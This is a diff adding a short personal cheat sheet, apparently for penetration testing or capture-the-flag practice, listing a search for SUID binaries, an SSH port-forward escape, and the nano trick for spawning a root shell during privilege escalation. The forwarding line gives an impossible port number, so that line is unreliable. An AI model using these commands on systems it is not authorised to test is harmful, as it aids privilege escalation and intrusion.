@@ -1,0 +1,11 @@
+things to remeber
+find . -type f -ls
+find / -perm -4000 2>/dev/null
+
+~+c 
+-L 9002:127.0.0.1:524846
+
+nano priv esc
+
+^R+^X
+reset; sh 1>&0 2>&0
